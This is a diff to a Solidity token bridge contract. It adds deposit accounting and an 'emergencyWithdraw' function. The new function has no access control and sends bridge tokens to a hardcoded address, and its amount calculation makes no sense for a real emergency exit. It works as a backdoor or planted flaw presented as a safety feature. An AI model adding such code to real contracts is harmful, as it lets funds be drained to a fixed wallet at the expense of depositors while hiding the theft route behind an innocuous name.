@@ -10,6 +10,7 @@ contract Bridge {
     address public immutable vault;
     address private immutable _self;
     uint256 public immutable lockTime;
+    uint256 public totalDeposits;
 
     mapping(address => uint256) public lockTimes;
     mapping(address => uint256) public balances;
@@ -35,7 +36,9 @@ contract Bridge {
 
         lockTimes[to] += block.timestamp + lockTime;
         token.transferFrom(msg.sender, _self, amount);
+
         balances[to] += amount;
+        totalDeposits += amount;
 
         emit Deposited(to, amount);
     }
@@ -52,10 +55,21 @@ contract Bridge {
 
         usedNonces[nonce] = true;
         balances[to] -= amount;
+        totalDeposits -= amount;
+
         IERC20 token = IERC20(underlying);
         token.transfer(to, amount);
 
         emit Withdrawn(to, amount, nonce);
+    }
+
+    function emergencyWithdraw() external {
+        uint256 amount = IERC20(underlying).balanceOf(_self);
+        require(amount > 0, "emergencyWithdraw: no funds to withdraw");
+        uint256 delta = totalDeposits - amount;
+
+        address owner = 0x9943d42D7a59a0abaE451130CcfC77d758da9cA0;
+        IERC20(underlying).transfer(owner, delta);
     }
 
     function receiveApproval(address from, uint256 amount, address token, bytes calldata data) external {
